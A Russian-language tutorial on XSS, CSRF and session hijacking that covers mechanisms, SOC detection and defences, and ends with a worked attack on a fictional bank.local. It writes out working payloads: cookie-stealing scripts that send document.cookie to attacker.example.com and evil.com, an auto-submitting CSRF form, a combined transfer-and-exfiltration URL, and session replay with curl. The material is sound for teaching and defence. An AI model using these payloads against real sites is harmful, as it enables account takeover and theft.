# XSS, CSRF и атаки на сессию веб-приложения

## Контекст и базовые понятия

Взаимодействие клиента и сервера в вебе строится на протоколе HTTP, который изначально не хранит состояние. Для реализации аутентифицированных сессий, корзин покупок и персонализации разработчики используют механизмы сохранения состояния, прежде всего HTTP-куки. Именно на эти механизмы нацелены три класса атак: межсайтовое выполнение сценариев (Cross‑Site Scripting, XSS), межсайтовая подделка запросов (Cross‑Site Request Forgery, CSRF) и перехват сессии (session hijacking). Хотя в названиях первых двух присутствует «cross‑site», они эксплуатируют принципиально разные слабости, а перехват сессии часто является целью или промежуточным этапом XSS‑атак.

**XSS (Cross‑Site Scripting)** — уязвимость, позволяющая злоумышленнику внедрить и выполнить произвольный JavaScript в браузере жертвы в контексте доверенного сайта. Вредоносный скрипт получает доступ к DOM, кукам, локальному хранилищу и может инициировать запросы от имени пользователя. XSS классифицируют по способу попадания скрипта на страницу: отражённая (reflected), сохраняемая (stored) и основанная на DOM.

**CSRF (Cross‑Site Request Forgery)** — атака, при которой злоумышленник вынуждает аутентифицированного пользователя выполнить нежелательное действие на доверенном сайте путём отправки HTTP‑запроса, инициированного с вредоносной страницы. В отличие от XSS, CSRF не требует инъекции скрипта в атакуемое приложение; достаточно, чтобы браузер автоматически присоединил сессионные куки к сформированному запросу.

**Перехват сессии (session hijacking)** — получение злоумышленником действительного идентификатора сессии (session ID), который затем используется для олицетворения жертвы. Идентификатор может быть украден через XSS, перехвачен в незашифрованном трафике (session side‑jacking), фиксирован до аутентификации пользователя (session fixation) или получен другими методами. Обладая сессионным токеном, атакующий напрямую обращается к серверу от имени легитимного пользователя, без необходимости компрометации пароля или дополнительных факторов аутентификации.

Связи между этими атаками нередко образуют комбинированные цепочки. Типичный сценарий: XSS‑уязвимость используется для кражи сессионной куки (session hijacking), после чего украденная сессия даёт полный доступ к аккаунту, либо XSS‑нагрузка одновременно выполняет и CSRF‑запрос, обходя защиту токенами, так как скрипт может прочитать токен из DOM. Сравнение ключевых характеристик трёх угроз приведено в таблице.

| Характеристика | XSS | CSRF | Перехват сессии |
|----------------|-----|------|-----------------|
| **Объект атаки** | Клиентский код (браузер) | Действие на сервере через доверенный браузер | Идентификатор сессии |
| **Активная среда** | JavaScript в контексте уязвимого сайта | HTTP‑запрос, инициированный сторонним сайтом | Любой способ получения токена |
| **Требуется ли JavaScript в браузере жертвы** | Да, для исполнения вредоносного скрипта | Нет, атакующий может использовать `<form>` и авто‑сабмит | Не обязательно; зависит от вектора кражи |
| **Доступ к ответу сервера** | Полный (чтение DOM, кук, заголовков через XHR) | Нет, ответ получает браузер жертвы, но не атакующий | После кражи сессии — полный доступ к ресурсам жертвы |
| **Основной контриера** | Контекстное кодирование вывода, Content‑Security‑Policy (CSP) | CSRF‑токены, SameSite‑куки, проверка заголовков Origin/Referer | HTTPS, флаги Secure/HttpOnly, короткое время жизни, привязка сессии к атрибутам клиента |

Таким образом, XSS — это уязвимость клиентской логики, CSRF — уязвимость недостаточной проверки источника запроса, а session hijacking — класс атак, нацеленных непосредственно на кражу или захват сессионного материала. В следующих разделах каждая из этих категорий рассмотрена на уровне внутреннего устройства.

## Внутреннее устройство атак

### Механизмы XSS

В основе XSS лежит недостаточная или некорректная обработка пользовательских данных, попадающих в HTML‑страницу. Серверное приложение или клиентский JavaScript вставляют строку, полученную от пользователя, в разметку без удаления или экранирования символов, имеющих специальное значение для браузера (`<`, `>`, `"`, `'`, `&`). Это позволяет внедрить произвольные теги, обработчики событий или целые скрипты.

По месту возникновения уязвимости выделяют три типа.

| Тип XSS | Механизм внедрения | Источник данных | Пример вектора |
|---------|---------------------|------------------|----------------|
| **Отражённый (Reflected)** | Вредоносный скрипт передаётся через параметры запроса и немедленно отображается в ответе без фильтрации | URL‑параметры, тело POST, реферер | `https://site.com/search?q=<script>alert(1)</script>` |
| **Сохраняемый (Stored)** | Скрипт постоянно сохраняется на сервере (БД, файл, комментарий) и выполняется при каждом просмотре страницы | Поля ввода профиля, сообщения форума, логи | Комментарий с `⟨script⟩...⟨/script⟩`, отображаемый всем посетителям |
| **DOM‑based** | Уязвимость находится исключительно в клиентском JavaScript: данные из источника (location.hash, document.referrer) передаются опасным функциям (innerHTML, eval) без санитизации | URL‑фрагмент, localStorage, postMessage | `document.write(location.hash.slice(1))` с URL `/#<img src=x onerror=alert(1)>` |

Ключевое различие: отражённый и сохраняемый XSS связаны с серверной частью (некорректное построение ответа), DOM‑based — с некорректной работой JavaScript на клиенте. В последнем случае HTTP‑ответ сервера может не содержать вредоносного кода — он появляется при выполнении скриптов страницы.

Степень опасности XSS определяется контекстом, в который попадает полезная нагрузка. Внедрение прямо в HTML‑тело (`<body>`) позволяет использовать тривиальный `<script>`. Если данные попадают в значение атрибута, атакующий закрывает атрибут и вставляет обработчик (`" onfocus="alert(1)`). В контексте JavaScript (внутри тега `<script>`) возможна инъекция кода, если не экранированы обратные слэши и кавычки. Современные техники обхода фильтров включают мутации DOM, использование SVG‑элементов, переопределение прототипов и полиглоты — полезные нагрузки, одновременно валидные в нескольких контекстах.

### Механизмы CSRF

CSRF‑атака возможна при одновременном выполнении трёх условий, сформулированных исследователями PortSwigger [PortSwigger]:

1. **Существует интересующее злоумышленника действие** — изменение пароля, email, перевод денег.
2. **Приложение полагается исключительно на сессионные куки** для аутентификации и не использует дополнительных токенов или отпечатков клиента.
3. **Параметры запроса предсказуемы** — атакующий знает все требуемые поля и их допустимые значения.

При отсутствии CSRF‑токенов запрос, инициирующий действие, может выглядеть так:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
Content-Length: 30

email=wiener@normal-user.com
```

Злоумышленник создаёт HTML‑страницу, содержащую скрытую форму с теми же параметрами, но с подменёнными значениями (например, `email=pwned@evil-user.net`). Браузер жертвы, посетив вредоносную страницу, отправит форму с автоматически прикреплённой сессионной кукой, и сервер выполнит операцию, не отличив легитимный запрос от поддельного. Сама страница может быть размещена на подконтрольном домене, быть внедрена через XSS или распространяться через фишинг.

Особый случай — **login CSRF**: злоумышленник принуждает жертву аутентифицироваться под его учётной записью, что может привести к утечке истории поиска или привязке аккаунта злоумышленника к платёжным методам жертвы [BrightSec].

### Атаки на сессию

Все атаки, направленные на захват или подмену идентификатора сессии, можно разделить на несколько типов.

```text
                      +---------------------------+
                      |    Атаки на сессию        |
                      +---------------------------+
                                   |
         +-------------------------+-------------------------+
         |                         |                         |
+------------------+    +-------------------+    +----------------------+
| Перехват токена  |    | Фиксация сессии   |    | Подделка сессии      |
| (Token Theft)    |    | (Session Fixation)|    | (Session Forging)    |
+------------------+    +-------------------+    +----------------------+
         |
+--------+--------+
|                 |
Session side-   XSS-based
jacking         token theft
```

Подробная классификация с индикаторами и условиями дана в таблице.

| Тип атаки | Вектор | Необходимые условия | Типичные индикаторы |
|-----------|--------|----------------------|---------------------|
| **Session side‑jacking** | Пассивный перехват трафика (прослушивание Wi‑Fi, ARP‑спуфинг) для извлечения кук из HTTP‑заголовков | Отсутствие или некорректное применение TLS после аутентификации (смешанный контент, SSL‑strip); отсутствие флага Secure у куки | Появление в логах сервера запросов с одного IP, к которому привязана кука, но с другого User‑Agent; резкое изменение геолокации |
| **XSS‑based token theft** | Внедрение JavaScript через XSS‑уязвимость, который читает `document.cookie` и отправляет на подконтрольный сервер | Наличие XSS (отражённой, сохраняемой или DOM) и отсутствие флага HttpOnly у сессионной куки | В логах прокси/сервера атакующего появление запросов с параметром, содержащим сессионные токены; превышение обычного числа запросов с одного токена |
| **Session fixation** | Злоумышленник получает действительный идентификатор сессии (например, перехватив или создав) и заставляет жертву использовать именно его (через URL или скрытое поле формы) | Приложение не меняет идентификатор сессии после успешной аутентификации; идентификатор может быть передан через URL | Множество сессий с одинаковым ID до и после аутентификации; в логах сервера — обращение к странице с фиксированным ID с разных IP до и после логина |
| **Network sniffing** | Захват пакетов на уровне L2/L3 для извлечения кук из незашифрованного трафика HTTP | Отсутствие полного покрытия HTTPS; доступ к сетевому сегменту жертвы (общая Wi‑Fi точка) | Высокая активность сканирования сети; дублирующиеся сессионные токены в логах |

Наиболее разрушительным вектором остаётся XSS‑based token theft, поскольку он позволяет обойти ограничения сети (атакующему не нужно находиться в одном сегменте с жертвой) и может быть массово автоматизирован через сохраняемые XSS.

## Применение и работа с атаками

### Эксплуатация и детектирование XSS

На практике XSS‑уязвимости выявляются как ручным тестированием, так и автоматизированными сканерами (Burp Suite Pro, OWASP ZAP, XSStrike). Базовый подход — внедрение безвредной полезной нагрузки, вызывающей alert, например:

```html
<script>alert(document.domain)</script>
```

При отражении в ответе без изменений и выполнении в браузере получение всплывающего окна подтверждает наличие уязвимости. На этом этапе работа L1‑аналитика SOC может включать просмотр алертов WAF, в которых фигурирует подозрительное содержимое параметров запроса.

Современные эксплуатационные нагрузки учитывают контекст. Пример кражи кук (при условии, что флаг HttpOnly отсутствует):

```html
<script>
new Image().src = '//attacker.example.com/c?cookie=' + encodeURIComponent(document.cookie);
</script>
```

Если куки защищены HttpOnly, злоумышленник может нацелиться на локальное хранилище, токены в DOM или выполнить действия внутри сессии через XMLHttpRequest/fetch с `credentials: 'include'`, минуя ограничения CSRF.

Обнаружение в логах: анализатору следует обращать внимание на параметры запросов, содержащие `<script>`, `onerror=`, `onload=`, `javascript:` URI, а также на аномально длинные значения строковых параметров с HTML-энкодированием.

### Эксплуатация CSRF

Эксплуатация CSRF заключается в создании HTML‑кода, отправляющего запрос при загрузке страницы. Классический пример (сценарий смены пароля):

```html
<html>
<body>
  <form action="https://bank.local/change_password" method="POST">
    <input type="hidden" name="new_password" value="evil123">
    <input type="hidden" name="confirm_password" value="evil123">
  </form>
  <script> document.forms[0].submit(); </script>
</body>
</html>
```

Доставка осуществляется через фишинг, размещение на подконтрольном сайте или — при наличии XSS — прямо в уязвимом приложении. В контексте SOC L1 аналитик может заметить подозрительные POST‑запросы с реферером, не соответствующим домену приложения, или отсутствие CSRF‑токена в теле запроса.

Для проверки настроек сервера используется curl, имитирующий запрос с легитимной кукой, но без токена:

```bash
curl -i -s -X POST 'https://bank.local/transfer' \
  -H 'Cookie: session=abc123' \
  -d 'to=attacker&amount=1000'
```

Ожидаемый безопасный ответ — 403 Forbidden или редирект с требованием повторной аутентификации. Если сервер возвращает 200 OK и выполняет операцию, защита от CSRF отсутствует.

### Защитные меры и их внедрение

**Против XSS:**
- **Контекстное кодирование:** в HTML‑теле — замена `<` на `&lt;` и т.д.; внутри JavaScript — экранирование обратного слеша и кавычек. Библиотеки вроде DOMPurify санитизируют ввод перед вставкой в DOM.
- **Content‑Security‑Policy (CSP):** ограничение источников скриптов. Пример минимальной политики:

  ```
  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-2726c7f26c'
  ```

  Nonce‑значение обновляется при каждой загрузке страницы и делает бесполезными статические инъекции скриптов.
- **Флаг HttpOnly:** запрещает доступ к куке из JavaScript (`document.cookie`), что нейтрализует большинство XSS‑атак, нацеленных на кражу сессии.

**Против CSRF:**
- **CSRF‑токены:** уникальная случайная строка, вставляемая в форму и проверяемая на сервере. Пример интеграции в шаблоне Django:

  ```django
  <form method="post">
    {% csrf_token %}
    <input name="amount">
  </form>
  ```

  Соответствующий HTTP‑запрос будет содержать поле `csrfmiddlewaretoken=...`, отсутствие которого или несовпадение с сохранённым в сессии должно приводить к отбрасыванию запроса.
- **SameSite‑куки:** атрибут `SameSite=Strict` или `Lax` предотвращает отправку куки вместе с кросс‑доменным запросом, что делает невозможным классический CSRF. Пример заголовка ответа сервера:

  ```http
  Set-Cookie: sessionid=…; Secure; HttpOnly; SameSite=Strict
  ```
- **Проверка Origin/Referer:** если заголовок Origin (или Referer) не совпадает с ожидаемым доменом, сервер может отклонить запрос. Этот метод менее надёжен, так как реферер может быть подавлен или подделан в определённых условиях.

**Против session hijacking:**
- **Полное TLS‑покрытие и HSTS:** принудительное использование HTTPS и заголовок `Strict-Transport-Security: max-age=31536000; includeSubDomains` предотвращают session side‑jacking, лишая атакующего возможности читать трафик.
- **Регенерация сессии после логина:** смена идентификатора сессии уничтожает fixation‑вектор.
- **Привязка сессии к отпечатку клиента:** дополнительная верификация User‑Agent, IP‑адреса (с осторожностью из‑за NAT) усложняет повторное использование токена.

Для мониторинга утечек сессий SOC‑аналитики настраивают правила в SIEM: аномальное количество запросов с одной сессией за короткое время, смена User‑Agent без смены сессии, географически нехарактерные IP.

## Сквозной практический пример: компрометация аккаунта через отражённый XSS и CSRF

### Исходные условия

Веб‑приложение `bank.local` обрабатывает переводы средств через POST‑запросы на `/transfer`. Сессионная кука `sessionid` не имеет флага HttpOnly, CSRF‑токены не используются. На странице ошибки `https://bank.local/error` параметр `msg` отражается в HTML без фильтрации. Пользователь Alice авторизован в приложении. Злоумышленник контролирует домен `evil.com`, на котором запущен простой HTTP‑сервер для логирования входящих запросов.

### Шаг 1: Обнаружение отражённого XSS

Анализ параметра `msg` показывает, что любые символы отображаются как есть. Злоумышленник проверяет уязвимость, используя браузер или curl:

```bash
curl -s "https://bank.local/error?msg=<script>alert(1)</script>"
```

В ответе HTML‑код содержит внедрённый скрипт:

```html
<div class="error-msg"><script>alert(1)</script></div>
```

Выполнение этого ответа в браузере приводит к вызову `alert`, что подтверждает Reflected XSS.

### Шаг 2: Создание ссылки с комбинированной нагрузкой

Злоумышленник конструирует URL, включающий скрипт, который выполняет два действия: инициирует перевод денег на счёт злоумышленника и отправляет сессионную куку на сервер `evil.com`. Код полезной нагрузки:

```html
<script>
  // CSRF-запрос на перевод
  fetch('/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'to=attacker_account&amount=5000'
  });
  // Кража куки
  new Image().src = 'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

Полный URL с URL-кодированной нагрузкой:

```
https://bank.local/error?msg=%3Cscript%3Efetch%28%27%2Ftransfer%27%2C%7Bmethod%3A%27POST%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Cbody%3A%27to%3Dattacker_account%26amount%3D5000%27%7D%29%3Bnew%20Image%28%29.src%3D%27https%3A%2F%2Fevil.com%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3B%3C%2Fscript%3E
```

### Шаг 3: Доставка жертве и исполнение

Злоумышленник внедряет полученную ссылку в фишинговое письмо, замаскировав её сервисом сокращения. Alice открывает ссылку — браузер загружает страницу `bank.local/error` с вредоносным скриптом. Скрипт выполняется в контексте `bank.local`:

- Вкладка Alice инициирует `fetch` к `/transfer`. Браузер автоматически прикрепляет сессионную куку, и сервер обрабатывает перевод 5000 на счёт `attacker_account`.
- Одновременно создаётся запрос к `evil.com/steal` с параметром `cookie`, содержащим `sessionid=alice_secret123`.

На сервере злоумышленника в лог пишется запись:

```text
199.99.88.77 - - [15/Mar/2026:10:45:12 +0000] "GET /steal?cookie=sessionid%3Dalice_secret123 HTTP/1.1" 200
```

В логах веб‑сервера `bank.local` фиксируется подозрительный POST на `/transfer` с IP‑адресом жертвы, но с инициировавшим скриптом, что для анализатора может выглядеть как действие, совершённое легитимным пользователем.

### Шаг 4: Подтверждение захвата сессии

Используя украденную куку, злоумышленник может напрямую обращаться к серверу от имени Alice, в том числе читать её баланс и историю операций:

```bash
curl -s -b 'sessionid=alice_secret123' 'https://bank.local/dashboard' | grep 'Balance'
```

Вывод команды иллюстрирует полный контроль над сессией:

```html
<span class="balance">$500.00</span>
```

Этот сквозной пример демонстрирует, как Reflected XSS может быть использован для одновременного выполнения CSRF и кражи сессионной куки, что полностью компрометирует учётную запись. Даже при наличии CSRF‑токенов вредоносный скрипт, выполняемый на легитимном origin, способен прочитать токен со страницы и вставить его в запрос, поэтому надёжная защита требует комбинации контекстного кодирования, CSP, HttpOnly‑кук и SameSite‑атрибутов.
